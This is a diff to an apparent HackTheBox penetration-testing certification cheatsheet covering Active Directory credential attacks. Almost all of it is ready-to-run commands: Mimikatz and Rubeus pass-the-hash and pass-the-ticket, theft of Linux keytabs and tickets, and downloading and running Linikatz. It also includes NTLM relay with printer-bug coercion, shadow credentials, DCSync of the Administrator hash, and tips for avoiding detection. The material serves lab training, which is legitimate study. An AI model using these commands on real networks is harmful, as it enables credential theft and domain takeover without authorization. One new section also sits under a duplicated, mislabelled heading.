@@ -48,6 +48,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Pass the Ticket from Windows(PtT)](#pass-the-ticket-from-windows)
     - [Pass the Ticket from Linux(PtT)](#pass-the-ticket-from-linux)
     - [Pass the Certificate(PtC)](#pass-the-certificate)
+    - [Quick Reference — Decision Tree](#Quick-Reference-—-Decision-Tree)
 - [Attacking Common Services](#attacking-common-services)
     - [Attacking SMB](#attacking-smb)
     - [Attacking SQL](#attacking-sql)
@@ -1273,9 +1274,9 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:username /NTLM:<NTLM_HASH> /d
 ```
 ##### OverPass the Hash
 ```
-=========================
+===========================================================================
 From Windows
-=========================
+===========================================================================
 # --- Dump credentials from LSASS ---
 
 # Dump all cached password hashes and Kerberos keys from LSASS memory
@@ -1351,9 +1352,9 @@ cd C:\Tools\SysinternalsSuite\
 # Clear all tickets from current session (use before injecting new TGT)
 klist purge
 
-=========================
+===========================================================================
 From Linux
-=========================
+===========================================================================
 # --- Step 1: Dump credentials (do on compromised Windows host with Mimikatz first) ---
 
 # Extract NTLM hash and AES keys from LSASS memory (requires admin + SeDebugPrivilege)
@@ -1447,19 +1448,14 @@ Rubeus.exe dump /nowrap
 # Mimikatz - Extract Kerberos keys  ( we can get AES256_HMAC and  RC4_HMAC key )  ( RC4_HMAC same NTLM hash) 
 mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
 
-# Mimikatz - Pass the Key aka. OverPass the Hash ( using RC4_HMAC same NTLM hash ) ( spawn new cmd.exe process under the identity of user plaintext )
-mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HMAC or NTLM>" exit
-
-# Rubeus - Pass the Key aka. OverPass the Hash ( using AES256_HMAC ) 
-Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256_HMAC> /nowrap
-
-(Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.SO SHOULD USE RUBEUS )
-
 # Rubeus - Pass the Ticket ( using RC4_HMAC same NTLM ) 
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HMAC or NTLM> /ptt
 
 # Rubeus - Pass the Ticket ( using file ticket .kirbi ) 
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+# Inject base64-encoded ticket from Linux ccache into Windows session using Rubeus
+.\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 
 # Mimikatz - Pass the Ticket ( using file ticket .kirbi ) ( current command prompt have priv user plaintext) 
 mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" exit
@@ -1467,94 +1463,166 @@ mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz
 # Mimikatz - Pass the Ticket ( using file ticket .kirbi ) ( spawn new cmd have priv user plaintext ) 
 mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" "misc::cmd" exit
 
+# Verify ticket is loaded into current session
+klist
+
 ```
 ##### Pass the Ticket from Linux
 ```
-# realm - Check if Linux machine is domain-joined
+# --- Enumerate Kerberos artifacts on Linux domain-joined machines ---
+
+# Check if Linux machine is joined to Active Directory domain
 realm list
 
-# PS - Check if Linux machine is domain-joined
+# Check if SSSD or Winbind is running (indicates AD integration)
 ps -ef | grep -i "winbind\|sssd"
 
-# Using Find to search for files with keytab in the name (To use a keytab file, we must have read and write (rw) privileges on the file.)
+# Search filesystem for keytab files (contain pre-auth keys for service accounts)
 find / -name *keytab* -ls 2>/dev/null
 
-# Reviewing environment variables for ccache files.
-env | grep -i krb5
-
-# Using Find to search for files with krb5cc in the name   
-find / -name *krb5cc* -ls 2>/dev/null
-
-# Searching for ccache files in /tmp
+# Search for existing ccache ticket files in /tmp
 find /tmp -name *krb5cc* -ls 2>/dev/null
 
-# Confirm which ticket we are using
+# Check environment variables for cached Kerberos ticket paths
+env | grep -i krb5
+
+# Confirm which ticket is currently active in session
 klist
 
-# Listing KeyTab file information
-list -k -t /opt/specialfiles/carlos.keytab
+# --- Keytab file operations ---
 
-# Impersonating a user with a KeyTab
+# List contents of a keytab file — show principals and key versions
+klist -k -t /opt/specialfiles/carlos.keytab
+
+# Impersonate a user using their keytab file (obtain TGT as that user)
 kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
 
-# Extracting KeyTab hashes with KeyTabExtract  ( https://github.com/sosdave/KeyTabExtract )
-python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+# Extract password hashes from keytab file using KeyTabExtract
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+# → Reveals RC4_HMAC (= NTLM hash) and AES keys embedded in keytab
 
-# Impersonating a user with a KeyTab
-kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+# --- Use existing ccache ticket file ---
 
-# Setting the KRB5CCNAME environment variable
+# Set KRB5CCNAME to an existing ccache ticket file for impersonation
 export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 
-# Impacket Ticket converter file ccache to kirbi  ( https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) 
+# Verify the ticket is valid after setting KRB5CCNAME
+klist
+
+# --- Convert tickets between formats ---
+
+# Convert ccache (Linux) to kirbi (Windows) format for use with Rubeus/Mimikatz
 impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 
-# Importing converted ticket into Windows session with Rubeus
-C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+# Convert kirbi (Windows) to ccache (Linux) format for use with impacket tools
+impacket-ticketConverter julio.kirbi julio.ccache
 
-# using Linikatz tool to  exploiting credentials on Linux machines when there is an integration with Active Directory   ( https://github.com/CiscoCXSecurity/linikatz ) 
+# --- Exploit Linux AD credentials with Linikatz ---
+
+# Download and run Linikatz to extract Kerberos credentials from Linux AD-joined machines
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 /opt/linikatz.sh
 
 ```
 ##### Pass the Certificate
 ```
-(AD CS NTLM Relay Attack (ESC8)) 
-# use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service ( relay NTLM authenticate and get file certificate .pfx ) 
+# --- AD CS ESC8: NTLM Relay to Certificate Authority ---
+
+# Start NTLM relay listener targeting AD CS Web Enrollment endpoint to capture certificate
 impacket-ntlmrelayx -debug -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 
-# force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug
+# Trigger machine account authentication using Printer Bug (SpoolSS)
 python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+# → Forces DC machine account to authenticate → relay captures certificate (.pfx)
 
-# install gettgtpkinit.py  and setting environment
+# --- PKINITtools setup (required for certificate → TGT conversion) ---
+
+# Clone and setup PKINITtools in virtual environment
 git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
-python3 -m venv .venv
-source .venv/bin/activate
+python3 -m venv .venv && source .venv/bin/activate
 pip3 install -r requirements.txt
 pip3 install -I git+https://github.com/wbond/oscrypto.git
 
-#  perform a Pass-the-Certificate attack to obtain a TGT by file certificate .pfx and save to file .ccache
-python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+# Obtain TGT from captured .pfx certificate (Pass-the-Certificate)
+python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.129.234.109  'inlanefreight.local/dc01$' /tmp/dc.ccache
 
-# Once successfully obtain a TGT, next perform Pass-the-Ticket (PtT) to dump all hash  ( machine account DC01$ have priv same Domain Admins)
+# Set KRB5CCNAME to use the obtained machine account TGT
 export KRB5CCNAME=/tmp/dc.ccache
+
+# Use machine account TGT to DCSync and dump Administrator hash
 impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 
-(Shadow Credentials (msDS-KeyCredentialLink))
-# use pywhisker to generates an X.509 certificate and writes the public key to the victim user's msDS-KeyCredentialLink attribute ( https://github.com/ShutdownRepo/pywhisker ) 
-pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add 
+# --- Shadow Credentials (msDS-KeyCredentialLink) ---
 
-# In the command above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown. We will use this file with gettgtpkinit.py to acquire a TGT as the victim
+# Add Shadow Credential to victim account using pywhisker — generates X.509 cert
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+# → Outputs: PFX file (e.g. eFUVVTPf.pfx) and password
+
+# Use generated PFX certificate to obtain TGT as victim user
 python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 
-# With the TGT obtained, we may once again pass the ticket
+# Set KRB5CCNAME to use victim's TGT
 export KRB5CCNAME=/tmp/jpinkman.ccache
+
+# Verify obtained ticket
 klist
 
 # When pkinit disable , read below 
 https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
 
 https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
+
+```
+##### Pass the Certificate
+```
+Have credentials?
+│
+├── Plaintext password
+│   └── PsExec / WMI / WinRM / RDP directly
+│
+├── NTLM Hash only
+│   ├── Target accepts NTLM?
+│   │   └── YES → Pass-the-Hash
+│   │           → impacket-wmiexec -hashes :HASH
+│   │           → evil-winrm -H HASH
+│   │           → xfreerdp /pth:HASH
+│   │
+│   └── Target enforce Kerberos only?
+│       └── YES → Overpass-the-Hash
+│               → impacket-getTGT -hashes → export KRB5CCNAME → -k -no-pass
+│               → Rubeus asktgt /rc4:HASH /ptt (Windows)
+│
+├── AES256/AES128 Key
+│   └── Overpass-the-Hash (OPSEC preferred)
+│       → impacket-getTGT -aesKey → export KRB5CCNAME → -k -no-pass
+│       → Rubeus asktgt /aes256:KEY /ptt /opsec (Windows)
+│
+├── Kerberos Ticket (.kirbi / .ccache)
+│   └── Pass-the-Ticket
+│       → export KRB5CCNAME=ticket.ccache (Linux)
+│       → Rubeus ptt /ticket:file.kirbi (Windows)
+│       → Mimikatz kerberos::ptt (Windows)
+│
+└── X.509 Certificate (.pfx)
+    └── Pass-the-Certificate
+        → gettgtpkinit.py -cert-pfx → TGT → PtT chain
+
+─────────────────────────────────────────────────────────
+Encryption type decision for OPtH:
+
+Domain RC4 enabled  → can use NTLM hash directly (/rc4 or -hashes)
+Domain AES only     → MUST use AES256 key (/aes256 or -aesKey)
+Always prefer AES256 when both available → no etype downgrade detection
+─────────────────────────────────────────────────────────
+
+SPN reference for service tickets:
+TERMSRV/<host>   → RDP (Terminal Services)
+WSMAN/<host>     → WinRM / evil-winrm
+CIFS/<host>      → SMB file shares
+HTTP/<host>      → IIS / Web services
+MSSQLSvc/<host>  → SQL Server
+HOST/<host>      → Generic (covers multiple services)
+
 ```
 ## Attacking Common Services
 
